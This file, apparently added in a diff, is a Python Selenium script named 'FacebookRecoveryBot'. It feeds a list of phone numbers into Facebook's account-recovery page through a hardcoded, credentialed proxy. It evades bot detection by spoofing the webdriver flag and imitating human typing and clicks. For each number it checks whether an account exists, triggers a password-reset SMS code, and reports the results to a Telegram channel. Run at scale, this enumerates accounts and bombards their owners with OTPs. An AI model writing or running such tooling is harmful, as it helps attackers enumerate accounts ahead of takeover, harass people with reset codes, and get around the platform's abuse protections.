@@ -1,0 +1,408 @@
+import os
+import time
+import random
+import logging
+from seleniumbase import Driver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
+import requests
+
+# Configuration
+CONFIG = {
+    'base_url': 'https://web.facebook.com/login/identify/?ctx=recover&from_login_screen=0',
+    'phone_numbers_file': 'phone_numbers.txt',
+    'telegram_bot_token': 'YOUR_TELEGRAM_BOT_TOKEN',
+    'telegram_channel_id': '-1003481502962',
+    'timeout': 30,
+    'proxy': 'aagrflash:aagrflash@as.75ce620de1d51edc.abcproxy.vip:4950'
+}
+
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('facebook_recovery.log'),
+        logging.StreamHandler()
+    ]
+)
+
+class FacebookRecoveryBot:
+    def __init__(self, proxy=None):
+        self.driver = None
+        self.setup_driver(proxy)
+        
+    def setup_driver(self, proxy):
+        """Setup SeleniumBase driver with proxy and stealth options"""
+        try:
+            driver_config = {
+                'headless': False,
+                'uc': True,
+                'undetectable': True,
+            }
+            
+            if proxy:
+                driver_config['proxy'] = proxy
+                logging.info(f"Using proxy: {proxy.split('@')[-1]}")
+            
+            self.driver = Driver(**driver_config)
+            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            self.driver.set_window_size(random.randint(1200, 1400), random.randint(800, 1000))
+            logging.info("Driver setup completed")
+            
+        except Exception as e:
+            logging.error(f"Error setting up driver: {e}")
+            raise
+        
+    def human_like_delay(self, min_seconds=2, max_seconds=5):
+        """Random delay to mimic human behavior"""
+        delay = random.uniform(min_seconds, max_seconds)
+        time.sleep(delay)
+        
+    def human_like_typing(self, element, text):
+        """Type like a human with random delays"""
+        for char in text:
+            element.send_keys(char)
+            time.sleep(random.uniform(0.1, 0.3))
+            
+    def human_like_click(self, element):
+        """Click like a human with mouse movements"""
+        try:
+            self.driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", element)
+            self.human_like_delay(0.5, 1)
+            
+            actions = ActionChains(self.driver)
+            actions.move_to_element_with_offset(element, random.randint(-2, 2), random.randint(-2, 2))
+            actions.pause(random.uniform(0.2, 0.5))
+            actions.click()
+            actions.perform()
+        except:
+            element.click()
+        
+    def send_telegram_message(self, message):
+        """Send message to Telegram channel"""
+        try:
+            url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
+            payload = {
+                'chat_id': CONFIG['telegram_channel_id'],
+                'text': message,
+                'parse_mode': 'HTML'
+            }
+            response = requests.post(url, data=payload, timeout=10)
+            if response.status_code == 200:
+                logging.info(f"Telegram message sent")
+            else:
+                logging.error(f"Failed to send Telegram message")
+        except Exception as e:
+            logging.error(f"Error sending Telegram message: {e}")
+
+    def wait_for_element(self, by, value, timeout=CONFIG['timeout']):
+        """Wait for element to be present"""
+        try:
+            return WebDriverWait(self.driver, timeout).until(
+                EC.presence_of_element_located((by, value))
+            )
+        except TimeoutException:
+            logging.error(f"Element not found: {by} = {value}")
+            return None
+
+    def wait_for_element_clickable(self, by, value, timeout=CONFIG['timeout']):
+        """Wait for element to be clickable"""
+        try:
+            return WebDriverWait(self.driver, timeout).until(
+                EC.element_to_be_clickable((by, value))
+            )
+        except TimeoutException:
+            logging.error(f"Element not clickable: {by} = {value}")
+            return None
+
+    def detect_page_state(self):
+        """Detect specific page states based on text content and elements"""
+        try:
+            page_text = self.driver.page_source.lower()
+            current_url = self.driver.current_url.lower()
+            
+            # Check for "No Search Results"
+            if "no search results" in page_text or "your search did not return any results" in page_text:
+                logging.info("Detected: No Search Results page")
+                return "no_results"
+            
+            # Check for "Reset Your Password" page with SMS options
+            reset_password_elements = [
+                "reset your password",
+                "how do you want to receive the code",
+                "send code via sms"
+            ]
+            
+            if any(text in page_text for text in reset_password_elements):
+                # Verify it has the SMS radio button
+                sms_radio = self.driver.find_elements(By.XPATH, "//input[contains(@value, 'send_sms')]")
+                if sms_radio:
+                    logging.info("Detected: Reset Password Method Selection page")
+                    return "reset_method"
+            
+            # Check for "Enter Security Code"
+            if "enter security code" in page_text:
+                logging.info("Detected: Enter Security Code page")
+                return "enter_code"
+            
+            # Check for Find Your Account page
+            if "find your account" in page_text and self.driver.find_elements(By.ID, "identify_email"):
+                logging.info("Detected: Find Your Account page")
+                return "find_account"
+            
+            # Check for block
+            block_indicators = ["temporarily blocked", "misusing this feature", "community standards", "too fast"]
+            for indicator in block_indicators:
+                if indicator in page_text:
+                    logging.error("Facebook block detected!")
+                    return "blocked"
+            
+            logging.warning(f"Unknown page state. URL: {current_url}")
+            return "unknown"
+            
+        except Exception as e:
+            logging.error(f"Error in page detection: {e}")
+            return "unknown"
+
+    def process_phone_number(self, phone_number):
+        """Process a single phone number through the recovery flow"""
+        logging.info(f"🔍 Processing: {phone_number}")
+        
+        try:
+            # Navigate to the recovery page in same tab
+            logging.info("🌐 Navigating to Facebook recovery page...")
+            self.driver.get(CONFIG['base_url'])
+            self.human_like_delay(3, 5)
+            
+            # Detect initial page state
+            page_state = self.detect_page_state()
+            
+            if page_state == "blocked":
+                message = f"🚫 Facebook Blocked\n📱 Phone: {phone_number}"
+                self.send_telegram_message(message)
+                return "blocked"
+            
+            if page_state != "find_account":
+                logging.warning(f"Unexpected initial page: {page_state}")
+                # Try to reload
+                self.driver.get(CONFIG['base_url'])
+                self.human_like_delay(2, 4)
+                page_state = self.detect_page_state()
+            
+            # Step 1: Enter phone number and search
+            if page_state == "find_account":
+                email_input = self.wait_for_element(By.ID, "identify_email")
+                if not email_input:
+                    logging.error("❌ Could not find phone input field")
+                    return "error"
+                
+                email_input.clear()
+                self.human_like_delay(1, 2)
+                self.human_like_typing(email_input, phone_number)
+                logging.info(f"📝 Entered phone number: {phone_number}")
+                self.human_like_delay(1, 2)
+                
+                # Click Search button
+                search_btn = self.wait_for_element_clickable(By.ID, "did_submit")
+                if search_btn:
+                    self.human_like_click(search_btn)
+                    logging.info("🔍 Clicked Search button")
+                    self.human_like_delay(4, 6)
+                else:
+                    logging.error("❌ Search button not found")
+                    return "error"
+            else:
+                logging.error(f"❌ Not on Find Account page. Current: {page_state}")
+                return "error"
+            
+            # Step 2: Check search results
+            page_state = self.detect_page_state()
+            logging.info(f"📄 Page after search: {page_state}")
+            
+            if page_state == "no_results":
+                message = f"❌ Account Not Found\n📱 Phone: {phone_number}\n⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                self.send_telegram_message(message)
+                logging.info(f"❌ No account found for {phone_number}")
+                return "not_found"
+            
+            elif page_state == "reset_method":
+                message = f"✅ Account Found!\n📱 Phone: {phone_number}\n⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                self.send_telegram_message(message)
+                logging.info(f"✅ Account found for {phone_number}")
+                return self.handle_reset_password_page(phone_number)
+            
+            elif page_state == "blocked":
+                message = f"🚫 Blocked After Search\n📱 Phone: {phone_number}"
+                self.send_telegram_message(message)
+                return "blocked"
+            
+            else:
+                logging.warning(f"Unexpected page after search: {page_state}")
+                message = f"❌ Account Not Found\n📱 Phone: {phone_number}\n⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                self.send_telegram_message(message)
+                return "not_found"
+                
+        except Exception as e:
+            logging.error(f"❌ Error processing {phone_number}: {e}")
+            message = f"❌ Processing Error\n📱 Phone: {phone_number}\n⚠️ Error: {str(e)}"
+            self.send_telegram_message(message)
+            return "error"
+
+    def handle_reset_password_page(self, phone_number):
+        """Handle the Reset Your Password page - SMS already selected, just click Continue"""
+        logging.info("🔄 Handling Reset Password page...")
+        
+        try:
+            # Check if SMS is already selected (from your HTML, it's checked="1")
+            sms_radio = self.wait_for_element(By.XPATH, "//input[contains(@value, 'send_sms')]")
+            if not sms_radio:
+                logging.error("❌ SMS radio button not found")
+                return "error"
+            
+            # Verify SMS is selected
+            if not sms_radio.is_selected():
+                logging.warning("SMS not selected, selecting it...")
+                self.human_like_click(sms_radio)
+                self.human_like_delay(1, 2)
+            else:
+                logging.info("✅ SMS option already selected")
+            
+            # Find and click Continue button
+            continue_btn = self.wait_for_element_clickable(By.XPATH, "//button[@name='reset_action']")
+            
+            if not continue_btn:
+                # Try alternative selectors
+                continue_btn = self.wait_for_element_clickable(By.XPATH, "//button[contains(text(), 'Continue')]")
+            
+            if not continue_btn:
+                logging.error("❌ Continue button not found")
+                return "error"
+                
+            self.human_like_click(continue_btn)
+            logging.info("➡️ Clicked Continue button")
+            self.human_like_delay(5, 8)
+            
+            # Check result after continue
+            page_state = self.detect_page_state()
+            logging.info(f"📄 Page after continue: {page_state}")
+            
+            if page_state == "enter_code":
+                message = f"✅ OTP Send Success!\n📱 Phone: {phone_number}\n⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                self.send_telegram_message(message)
+                logging.info(f"✅ OTP sent successfully to {phone_number}")
+                return "success"
+            
+            elif page_state == "blocked":
+                message = f"🚫 Blocked After Continue\n📱 Phone: {phone_number}"
+                self.send_telegram_message(message)
+                return "blocked"
+            
+            else:
+                message = f"❌ Cannot Send OTP\n📱 Phone: {phone_number}\n⚠️ Status: {page_state}"
+                self.send_telegram_message(message)
+                logging.warning(f"❌ Could not send OTP to {phone_number}")
+                return "error"
+                
+        except Exception as e:
+            logging.error(f"❌ Error in reset password: {e}")
+            message = f"❌ Reset Error\n📱 Phone: {phone_number}\n⚠️ Error: {str(e)}"
+            self.send_telegram_message(message)
+            return "error"
+
+    def close(self):
+        """Close the browser"""
+        if self.driver:
+            try:
+                self.driver.quit()
+            except:
+                pass
+
+def main():
+    """Main function"""
+    # Check if phone numbers file exists
+    if not os.path.exists(CONFIG['phone_numbers_file']):
+        logging.error(f"Phone numbers file not found!")
+        with open(CONFIG['phone_numbers_file'], 'w') as f:
+            f.write("+1234567890\n+0987654321\n")
+        logging.info(f"Sample file created. Please add phone numbers.")
+        return
+
+    # Read phone numbers
+    with open(CONFIG['phone_numbers_file'], 'r') as f:
+        phone_numbers = [line.strip() for line in f if line.strip()]
+    
+    if not phone_numbers:
+        logging.error("No phone numbers found!")
+        return
+
+    logging.info(f"📱 Loaded {len(phone_numbers)} phone numbers")
+    
+    # Create bot instance (same tab for all numbers)
+    bot = FacebookRecoveryBot(proxy=CONFIG['proxy'])
+    
+    successful = 0
+    not_found = 0
+    blocked = 0
+    errors = 0
+    
+    try:
+        for i, phone_number in enumerate(phone_numbers, 1):
+            logging.info(f"🔨 Processing {i}/{len(phone_numbers)}: {phone_number}")
+            
+            result = bot.process_phone_number(phone_number)
+            
+            if result == "success":
+                successful += 1
+            elif result == "not_found":
+                not_found += 1
+            elif result == "blocked":
+                blocked += 1
+            else:
+                errors += 1
+            
+            # Log current progress
+            logging.info(f"📊 Progress: {successful}✅ {not_found}❌ {blocked}🚫 {errors}⚠️")
+            
+            # Wait 5 seconds before next number (same tab)
+            if i < len(phone_numbers):
+                logging.info("⏳ Waiting 5 seconds for next number...")
+                time.sleep(5)
+                
+                # Refresh the page for next number (same URL)
+                logging.info("🔄 Refreshing page for next number...")
+                bot.driver.get(CONFIG['base_url'])
+                bot.human_like_delay(2, 3)
+            
+    except KeyboardInterrupt:
+        logging.info("🛑 Process interrupted by user")
+    except Exception as e:
+        logging.error(f"💥 Unexpected error: {e}")
+    finally:
+        bot.close()
+    
+    # Final summary
+    final_message = f"""
+📊 Facebook Recovery Bot - Final Report
+✅ OTP Sent Success: {successful}
+❌ Account Not Found: {not_found}
+🚫 Blocked: {blocked}
+⚠️ Errors: {errors}
+📱 Total Processed: {len(phone_numbers)}
+⏰ Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}
+    """
+    logging.info(final_message)
+    
+    # Send final report to Telegram
+    try:
+        bot_temp = FacebookRecoveryBot()
+        bot_temp.send_telegram_message(final_message)
+        bot_temp.close()
+    except:
+        pass
+
+if __name__ == "__main__":
+    main()
